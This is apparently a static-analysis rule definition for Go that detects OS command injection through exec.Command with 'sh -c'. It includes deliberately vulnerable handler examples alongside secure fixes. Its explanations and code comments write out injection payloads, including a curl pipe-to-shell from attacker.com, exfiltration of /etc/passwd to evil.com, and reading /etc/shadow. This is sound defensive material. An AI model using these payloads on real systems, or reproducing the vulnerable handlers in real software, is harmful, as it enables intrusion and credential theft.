@@ -1,0 +1,225 @@
+# Rule Identity
+id: GO-SEC-002
+name: OS Command Injection via HTTP Input
+short_description: User-controlled HTTP request input reaches os/exec command execution — the critical pattern is exec.Command("sh", "-c", userInput) which enables full shell injection with metacharacters.
+
+# Classification
+severity: CRITICAL
+category: security
+language: go
+ruleset: golang/GO-SEC-002
+
+# Vulnerability Details
+cwe:
+  - id: CWE-78
+    name: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    url: https://cwe.mitre.org/data/definitions/78.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - go
+  - security
+  - command-injection
+  - os-exec
+  - shell-injection
+  - CWE-78
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  OS command injection occurs when user-controlled input is passed to shell command
+  execution functions without sanitization. Go's os/exec package is safer than most
+  languages by default — `exec.Command("ls", userInput)` passes the argument as a
+  separate string to the OS, not through a shell, so shell metacharacters (`;`, `|`,
+  `&&`, `$(...)`, backticks) are literal and not interpreted.
+
+  **The critical vulnerability pattern** is when developers explicitly use a shell
+  interpreter: `exec.Command("sh", "-c", userInput)` or `exec.Command("bash", "-c",
+  userInput)`. This invokes a shell to parse the command string, where all shell
+  metacharacters become active and enable full command injection.
+
+  **Other dangerous patterns**:
+  - Passing user input as the binary name: `exec.Command(userInput, args...)` — attacker
+    controls which binary is executed.
+  - Argument injection: `exec.Command("ffmpeg", "-i", userInput)` — while not shell
+    injection, ffmpeg and many tools have argument injection vulnerabilities (e.g.,
+    `-vf` flag injection).
+
+  **Real-world Go command injection CVEs**:
+  - Multiple Go-based CI/CD tools and file conversion services have been found vulnerable
+    when user-supplied filenames or format parameters were passed to exec.Command with
+    shell invocation.
+  - Go tooling that wraps git, ffmpeg, imagemagick, or similar is particularly at risk.
+
+  **Preferred alternative**: Always use Go's native libraries instead of shelling out.
+  For image processing: github.com/disintegration/imaging, golang.org/x/image.
+  For git: github.com/go-git/go-git. This eliminates the attack surface entirely.
+
+message: |
+  User input reaches os/exec command execution. If using exec.Command("sh", "-c", input),
+  this enables full shell injection. Use Go native libraries instead of shelling out,
+  or validate input against a strict allowlist and pass as separate exec.Command arguments.
+
+security_implications:
+  - title: Remote Code Execution (RCE)
+    description: |
+      Injecting `; curl https://attacker.com/payload | sh` executes arbitrary commands
+      as the application process user. In containerized environments this can achieve
+      container escape via kernel exploits. On bare metal, it provides full server access.
+  - title: Data Exfiltration
+    description: |
+      Injected commands can read `/etc/passwd`, application configuration files containing
+      database credentials, TLS private keys, or application secrets and transmit them
+      out-of-band via curl, wget, or DNS queries.
+  - title: Persistence and Backdoor Installation
+    description: |
+      Attackers write cron jobs, SSH authorized_keys, or startup scripts for persistent
+      access. In Kubernetes environments, injected commands can exfiltrate service account
+      tokens for lateral movement across the cluster.
+  - title: Argument Injection
+    description: |
+      Even without shell metacharacters, passing user input as a command argument can
+      trigger argument injection vulnerabilities in the target tool. git with
+      `--upload-pack` can exfiltrate arbitrary files; ffmpeg with crafted input
+      paths can read arbitrary server files.
+
+vulnerable_example: |
+  // VULNERABLE: exec.Command with shell — full shell injection
+  func convertHandler(w http.ResponseWriter, r *http.Request) {
+      filename := r.FormValue("file")
+      // Attacker sends: file=input.jpg; curl https://evil.com/$(cat /etc/passwd)
+      cmd := exec.Command("sh", "-c", "convert "+filename+" output.png")
+      cmd.Run()
+  }
+
+  // VULNERABLE: user controls binary name
+  func runTool(w http.ResponseWriter, r *http.Request) {
+      tool := r.FormValue("tool")
+      // Attacker sends: tool=/bin/sh
+      cmd := exec.Command(tool, "arg1", "arg2")
+      output, _ := cmd.Output()
+      w.Write(output)
+  }
+
+  // VULNERABLE: bash -c with concatenation
+  func processFile(w http.ResponseWriter, r *http.Request) {
+      format := r.FormValue("format")
+      name := r.FormValue("name")
+      // Attacker sends: format=jpg && cat /etc/shadow
+      cmd := exec.Command("bash", "-c", "ffmpeg -i input -f "+format+" "+name)
+      cmd.Run()
+  }
+
+secure_example: |
+  // SECURE: allowlist validation + separate arguments (no shell)
+  func convertHandler(w http.ResponseWriter, r *http.Request) {
+      format := r.FormValue("format")
+      // Strict allowlist — only these formats permitted
+      allowed := map[string]bool{"png": true, "jpg": true, "webp": true}
+      if !allowed[format] {
+          http.Error(w, "invalid format", http.StatusBadRequest)
+          return
+      }
+      // Pass format as a separate argument — no shell, no metacharacter interpretation
+      cmd := exec.CommandContext(r.Context(), "convert", "input.bmp", "output."+format)
+      if output, err := cmd.Output(); err != nil {
+          http.Error(w, "conversion failed", http.StatusInternalServerError)
+          return
+      } else {
+          w.Write(output)
+      }
+  }
+
+  // BEST: use Go native library instead of shelling out
+  import "github.com/disintegration/imaging"
+
+  func resizeHandler(w http.ResponseWriter, r *http.Request) {
+      // Pure Go image processing — no subprocess, no injection risk
+      img, err := imaging.Open("input.jpg")
+      if err != nil {
+          http.Error(w, "open failed", 500)
+          return
+      }
+      resized := imaging.Resize(img, 800, 0, imaging.Lanczos)
+      imaging.Encode(w, resized, imaging.JPEG)
+  }
+
+  // SECURE: git operations via pure Go library
+  import "github.com/go-git/go-git/v5"
+
+  func cloneRepo(repoURL string) error {
+      // Pure Go git implementation — no exec.Command("git", ...) needed
+      _, err := git.PlainClone("/tmp/repo", false, &git.CloneOptions{URL: repoURL})
+      return err
+  }
+
+recommendations:
+  - Use Go native libraries instead of exec.Command for image processing, git, PDF, etc.
+  - Never use exec.Command("sh", "-c", ...) or exec.Command("bash", "-c", ...) with user input.
+  - If shelling out is unavoidable, validate input against an explicit allowlist and pass
+    as separate exec.Command arguments (not through a shell).
+  - The binary name (first argument to exec.Command) must never be user-controlled.
+  - Use exec.CommandContext with a timeout to limit resource exhaustion from injected commands.
+  - Run the application with least-privilege OS user to limit blast radius.
+  - In containers, use seccomp profiles and read-only filesystems as defense-in-depth.
+
+detection_scope: |
+  Tracks taint from HTTP framework request sources (net/http.Request, gin.Context,
+  echo.Context, fiber.Ctx) to exec.Command and exec.CommandContext calls with
+  global inter-procedural scope.
+
+# Real-World CVEs
+cves:
+  - id: CWE-78-Pattern
+    description: |
+      OS Command Injection is ranked #5 in CWE Top 25 (2024). Go-based tools that wrap
+      external binaries (ffmpeg, imagemagick, git, pandoc) are consistently found vulnerable
+      when user-supplied parameters are passed through shell invocation. The pattern is
+      universal across programming languages — Go's exec.Command("sh", "-c") is as
+      dangerous as Python's os.system() or Ruby's backticks.
+    url: https://cwe.mitre.org/data/definitions/78.html
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 — Injection"
+  - standard: CWE Top 25 (2024)
+    requirement: "CWE-78 — OS Command Injection (ranked #5)"
+  - standard: NIST SP 800-53 Rev 5
+    requirement: "SI-10 — Information Input Validation"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 — Protect against OS command injection attacks"
+
+# References
+references:
+  - title: "CWE-78: OS Command Injection — MITRE"
+    url: https://cwe.mitre.org/data/definitions/78.html
+  - title: "OWASP Command Injection"
+    url: https://owasp.org/www-community/attacks/Command_Injection
+  - title: "OWASP OS Command Injection Defense Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - title: "Go os/exec package documentation — exec.Command note on shell"
+    url: https://pkg.go.dev/os/exec#Command
+  - title: "go-git — Pure Go implementation of Git"
+    url: https://github.com/go-git/go-git
+  - title: "imaging — Pure Go image processing library"
+    url: https://github.com/disintegration/imaging
+
+# Similar Rules
+similar_rules:
+  - GO-PATH-001
+  - GO-SEC-001
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
